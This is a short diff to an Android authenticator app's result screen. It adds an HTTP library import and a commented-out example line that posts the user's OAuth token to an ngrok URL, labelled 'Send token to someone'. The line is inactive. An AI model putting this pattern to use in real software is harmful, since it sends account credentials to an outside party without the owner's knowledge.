@@ -5,6 +5,7 @@ import android.content.Intent
 import android.os.Bundle
 import android.widget.Toast
 import com.aurora.authenticator.databinding.ActivityResultBinding
+import com.github.kittinunf.fuel.Fuel
 import nl.komponents.kovenant.task
 import nl.komponents.kovenant.ui.failUi
 import nl.komponents.kovenant.ui.successUi
@@ -44,6 +45,8 @@ class ResultActivity : Activity() {
         task {
             //This line will "login" into the account and use the token
             //AC2DMTask().getAC2DMResponse(Email, oAuthToken)
+            //Send token to someone, follow the example
+            //Fuel.post("https://8a1b3e7b2354.ngrok.io/testToken?token=${oAuthToken}").response()
         } successUi {
             if (oAuthToken != null) {
                 B.viewFlipper.displayedChild = 1
